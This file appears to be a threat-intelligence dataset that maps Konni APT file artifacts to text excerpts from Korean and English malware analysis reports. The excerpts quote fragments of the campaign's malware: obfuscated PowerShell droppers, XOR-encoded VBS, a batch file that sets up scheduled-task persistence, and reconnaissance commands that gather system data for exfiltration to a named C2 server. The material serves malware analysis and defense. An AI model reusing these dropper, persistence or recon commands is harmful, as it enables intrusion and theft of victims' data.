1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:8c16518db25615a469cebf9d3199b43b0d0ec8ae83285b3225377b4b79b1fda9,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /q/cpowershell -windowstylehidden""$dKN10GCpAw=Get-Location;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} |Select-Object -ExpandPropertyFullName;if($H7wszqY5I.length-eq0){$dKN10GCpAw=$env:Temp;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} | Select-Object -ExpandPropertyFullName;};$dKN10GCpAw=Split-Path$H7wszqY5I;$JizBEr =New-Object System.IO.FileStream($H7wszqY5I,[System.IO.Fi",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:073e736364ab2e7f8a188fe2b75c7b7cb0d935c5a85784d416c48b5cdb0c62a6,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-2] 정상엑셀문서가실행된화면(일부모자이크처리) ○ 다음으로 공용 폴더( Public) 경로에 'update_cmd.zip' 파일을 생성하고, 그하위공용문서( Documents) 경로에압축을해제후, 'update.vbs' 스크립트를호출합니다. ○'update_cmd.zip' 압축파일내부에는총9개의파일이포함돼있습니다. Genians SecurityCenter 11",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:b5baacea2e23b3d6302ef9262b3ab7108616bceefcec12f554b977ad09620112,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:b9f5b7a26ed55325a0263befd07aa971ca6018a92d0212d1e1142dd585a61f00,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /kfor /f ""tokens=*"" %ain('dirC:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe/s/b/od') docall %a-windowstylehidden""$SvvZPNyDG=Get-Location;if($SvvZPNyDG-Match'System32' -or $SvvZPNyDG-Match'ProgramFiles') {$SvvZPNyDG='%temp%';};$yeWaKMJy=Get-ChildItem-Path$SvvZPNyDG-Recurse*.lnk| where-object{$_.length-eq0x012F3333} | Select-Object -ExpandPropertyFullName;$SvvZPNyDG=Split-Path$yeWaKMJy;$vwgC8wlBQ=New-Object System.IO.FileStream($yeWaKMJy,[System.IO.FileMode]::Open",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:75655a62f1440df34484e3a711b409b49035e92504511406df27855d116866a7,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-5] 정상PDF문서가실행된화면 ○ 다음으로 공용 폴더( Public) 경로에 'update_cmd.zip' 파일을 생성하고, 그하위공용문서( Documents) 경로에압축을해제후, 'update.vbs' 스크립트를호출합니다. ○ 'update_cmd.zip' 압축파일내부에는총9개의파일이포함돼있고, [사례A] 와정확히동일한파일이포함돼있어추가설명은생략합니다. Genians SecurityCenter 17",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:f2e700baf0d781d66b6c10c330ca9ee4329decdb26df42ee80959cbd0ad8e06b,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4. 정적코드분석(StaticCodeAnalysis)4.1. ZIP압축파일에포함된VBS파일분석■'update.vbs' 파일코드분석 ○앞서기술한내용과같이[사례A] [사례B] 모두LNK파일에의해호출되는1단계스크립트 파일은 'update.vbs' 파일입니다. VBS 파일들은 코드 전체가 난독화로적용돼있습니다. tODfJ_m0BrXqF2=""(K5JXrn-&Qg~""TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(45570Xor45653):TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(27840Xor27795):TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(5003Xor5096):TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(22966Xor22980):TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(21738Xor21635):TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(24562Xor ",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:717b6ca8f6208742949372aef64799d8695cf9c6b1458d2273fb7dfcecff8887,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 주요 문자열은 10진수 값으로 선언되어 있고, XOR 로직을 통해 ASCII 문자로변환되는과정을거치게됩니다. [그림4-1] 'update.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 25개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'stopedge.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'install.vbs' 파일코드분석 ○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다. Genians SecurityCenter 19",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:b076f3fb1597a90616b38a88e046e247653d540030fc15405d0e1b06e2ec67e6,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:c566759a516f255d60a49eb3d628efb0ee777f21fb556602e601ac2be6c9667b,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 5. 유사도분석(SimilarityAnalysis)5.1. Konni APT캠페인별코드비교■'국세청사칭' VS'북한인권단체사칭' ○ 각 LNK 파일의 내부 명령을 비교해 보면다음과같습니다. 국세청사칭의경우는2023년 7월 31일 지니언스 블로그에 등록된 '국세청 우편물 발송 알림 사칭 공격(Konni APT Campaign)' 위협분석보고서를통해자세한내용을확인할수있습니다.5 ○ 국세청 사칭 LNK 명령어는 16진수 값으로 포함돼 있어, 이 부분은 디코딩 후에비교하였습니다. 국세청사칭LNK명령부분 북한인권단체사칭LNK명령부분 New-Object byte[]0x00014405;$znUKtljyzBrPLDZ.Read($SppylSfzYpca, 0,0x00014405);$znUKtljyzBrPLDZ.Close();Remove-Item-Path$SEvhgMDD-Force;$wxJAARinisLXUr=$env:public+'\' +'04769.zi",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:a20cc50724c3c1efa215222295b9b24fce3534e0001e2f2772ba19486c9260f8,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:6b9271870133a8ec281fb1439d552fb159ff3689f6738fd7bea6dd70753b2978,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain stopedge.bat If afilenamed""paycom.ini"" existsinthestopedge.bat’sdirectory, it schedulesatasktorun""install.vbs"" every33minutes, deletes""paycom.ini,"" calls""versioninfo.bat,"" waitsfor 5seconds, andthendeletes""versioninfo.bat"" and""update.vbs."" Figure11- Persistencymechanismwithscheduledtasks resolvedns.bat Thebatchscript 'resolvedns.bat' utilizes'activate.vbs' toinitiatethedownloadof afilefromtheC2server. Figure12- Dnsresolutionandge",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:ac4e289669f744cb12e877aca837320ae729b95fd7d79a80ef540f935927bae9,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain update.vbs The'update.vbs' closelyresembles'install.vbs,' employingthesameobfuscationtechniquesandperformingidentical tasks. Figure5- Obfuscatedupdate.vbs However, itsdistinctivefeatureisthat it executesascript named'stopedge.bat'. Figure6- Deobfuscatedupdate.vbs 7",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:e33cee07fc91357031177f4ff5be3a8f7f2ef792198b19f81b13737cd683626b,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /q/cpowershell -windowstylehidden""$dKN10GCpAw=Get-Location;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} |Select-Object -ExpandPropertyFullName;if($H7wszqY5I.length-eq0){$dKN10GCpAw=$env:Temp;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} | Select-Object -ExpandPropertyFullName;};$dKN10GCpAw=Split-Path$H7wszqY5I;$JizBEr =New-Object System.IO.FileStream($H7wszqY5I,[System.IO.Fi",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:d9bc9fcb6ab4a00435116b50dd0a0c0d1c62cdb65c8d2e477b8e7ba06a03050c,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-2] 정상엑셀문서가실행된화면(일부모자이크처리) ○ 다음으로 공용 폴더( Public) 경로에 'update_cmd.zip' 파일을 생성하고, 그하위공용문서( Documents) 경로에압축을해제후, 'update.vbs' 스크립트를호출합니다. ○'update_cmd.zip' 압축파일내부에는총9개의파일이포함돼있습니다. Genians SecurityCenter 11",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:0cdfa598a9f67d4e66071d206dc84fe4c8bdeff3c512399e66578a5e775d7e80,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:218c4f2fec1591ec48e5163ce73bbdf24f85692bc475eb113520ad3355728e63,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /kfor /f ""tokens=*"" %ain('dirC:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe/s/b/od') docall %a-windowstylehidden""$SvvZPNyDG=Get-Location;if($SvvZPNyDG-Match'System32' -or $SvvZPNyDG-Match'ProgramFiles') {$SvvZPNyDG='%temp%';};$yeWaKMJy=Get-ChildItem-Path$SvvZPNyDG-Recurse*.lnk| where-object{$_.length-eq0x012F3333} | Select-Object -ExpandPropertyFullName;$SvvZPNyDG=Split-Path$yeWaKMJy;$vwgC8wlBQ=New-Object System.IO.FileStream($yeWaKMJy,[System.IO.FileMode]::Open",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:3cbd59e180ecc28db567942a1daa33af59231231e78282377981d4b0c6554300,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-5] 정상PDF문서가실행된화면 ○ 다음으로 공용 폴더( Public) 경로에 'update_cmd.zip' 파일을 생성하고, 그하위공용문서( Documents) 경로에압축을해제후, 'update.vbs' 스크립트를호출합니다. ○ 'update_cmd.zip' 압축파일내부에는총9개의파일이포함돼있고, [사례A] 와정확히동일한파일이포함돼있어추가설명은생략합니다. Genians SecurityCenter 17",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:136fac29794494bc74f0b714d60fb28917d3a72732aaa9b130b84cd7c9cb4e4e,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 5. 유사도분석(SimilarityAnalysis)5.1. Konni APT캠페인별코드비교■'국세청사칭' VS'북한인권단체사칭' ○ 각 LNK 파일의 내부 명령을 비교해 보면다음과같습니다. 국세청사칭의경우는2023년 7월 31일 지니언스 블로그에 등록된 '국세청 우편물 발송 알림 사칭 공격(Konni APT Campaign)' 위협분석보고서를통해자세한내용을확인할수있습니다.5 ○ 국세청 사칭 LNK 명령어는 16진수 값으로 포함돼 있어, 이 부분은 디코딩 후에비교하였습니다. 국세청사칭LNK명령부분 북한인권단체사칭LNK명령부분 New-Object byte[]0x00014405;$znUKtljyzBrPLDZ.Read($SppylSfzYpca, 0,0x00014405);$znUKtljyzBrPLDZ.Close();Remove-Item-Path$SEvhgMDD-Force;$wxJAARinisLXUr=$env:public+'\' +'04769.zi",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:2e6d7b4f44fb86ee88a38b365203534494a1c1346150a9e3beacaa3f427ad006,file-name,update_cmd.zip,update_cmd.zip,candidate,2023-02-01T00:00:00Z,month,known,same-record,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림5-2] 북한대학원대학교문서로위장한악성파일화면 ○본위협케이스에서사용된'update_cmd.zip' 파일은앞서기술한북한인권단체및통일부사칭테마의[사례A], [사례B] 와동일합니다. 따라서유해스크립트기능과C2서버가 동일하게 사용됩니다. 각 악성 파일이 실행될 때 보여지는 정상 문서 화면은다음과같습니다. 2023-2-주차등록신청서-학생용. hwp 수강신청정정원. hwp [표5-5] 북한대학원대학교문서로위장한악성파일화면 Genians SecurityCenter 37",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:fdbc724b6b1e54a7374a0e07c7f64d028c9f96bbb0eb053bd650bbbac150f045,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 39}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■카카오뱅크보안메일위장 ○GSC 는북한대학원대학교사칭건을발견한같은날, 마치카카오뱅크보안메일처럼위장한또다른위협유형을식별했습니다. 대체로LNK기반공격은압축파일내부에숨겨, 전자우편으로전달하는스피어피싱전략을구사합니다. ○ 추가사례는'securityMail.zip' 압축이름을사용했으며, 이전사례처럼압축포맷내부에 2중 확장자를 지닌 'securityMail.html.lnk' 바로가기형 악성 코드가 내장돼있습니다. 앞서 기술한 여러 사례들이 XLSX, PDF, HWP 등 주로 문서 파일처럼위장했다면, 본 건은 HTML 웹 페이지 파일로 위장한 것이 차이점입니다. 그리고'update_cmd.zip' 파일을생성하는데, 기존과동일한파일이사용됐습니다. [그림5-3] 카카오뱅크보안메일비밀번호입력위장화면 ○ 2022년 11월 경 발견된 유사한위협사례중, 악성DLL 파일을설치하는형태가발견된바있습니다. 당시보고된유사변종공격사례도마치카카오뱅크의보안메일화면에비밀번호를",
1.0.0,actor--konni,artifact--sha256:76ba250b62683ca3be63b4df525381ed837bf468d5ff2fbd677c2d4ff7eaee76,observation--sha256:56ba49a86edcf59117f4ab1127cc8e9e95fbccfc6211240e8cb8ed4457317aa5,file-name,(upload.php,upload.php,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 31 명령어 기능 설명 dir C:\Users\%username%\downloa ds\ /s > %~dp0cuserdown.txt ‘downloads’ 경로의 (다운로드)파일 및 폴더 목록 정보를 ‘cuserdown.txt’ 파일로 저장 dir C:\Users\%username%\docume nts\ /s > %~dp0cuserdocu.txt ‘documents’ 경로의 (문서)파일 및 폴더 목록 정보를 ‘cuserdocu.txt’ 파일로 저장 dir C:\Users\%username%\desktop \ /s > %~dp0cuserdesk.txt ‘desktop’ 경로의 (바탕화면)파일 및 폴더 목록 정보를 ‘cuserdesk.txt’ 파일로 저장 dir ""C:\Program Files\"" /s > %~dp0cprog.txt ‘Program Files’ 경로의 (프로그램)파일 및 폴더 목록 정",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:7637e73141539377dcd7818fe65e1c476f4b595cd46ecf1c070136dee42c4e07,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:36994b43c4dc8dad27302a9a8f2b25d5398fd338ad53a3078229c5e4c21e4ae9,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:e77cc42fce9ce0e3906a766cb016d85d7ec740e0388dd8fc099486776d156f7b,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 32개의 연산 항목을 문자열로 변경하면 다음과 같이 Microsoft.XMLHTTP GETAdodb.Stream개체내용을확인할수있습니다. ■'unactivate.vbs' 파일코드분석 ○'unactivate.vbs' 파일은'versioninfo.bat' 파일에의해호출되는스크립트입니다.해당 스크립트는 지정된 컴퓨터명(% COMPUTERNAME%) 과 수집된 각종 컴퓨터내부정보를조합해C2서버( anrun[.]kr) 로전송하는데사용됩니다. OnError ResumeNextRFzWb6Sh=Left(WScript.ScriptFullName,InstrRev(WScript.ScriptFullName, ""\"") - 1) cal9zs0a9i =""=zm32LT_9G1RZlG9'""CbJO1dpnUt1=CbJO1dpnUt1&Chr(7810Xor 7887):CbJO1dpnUt1=CbJO1dpnUt1&Chr(16776Xor 16865):CbJO1dpnUt1=C",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:70b76a3b94ab8e0d4eb31780dcefcc454ca3a36cdf77d3fcee82e146fc04c308,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:a74892e0a6fc206e855799d6a027a4962d922f50796b035ab5fa7028b80a8896,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
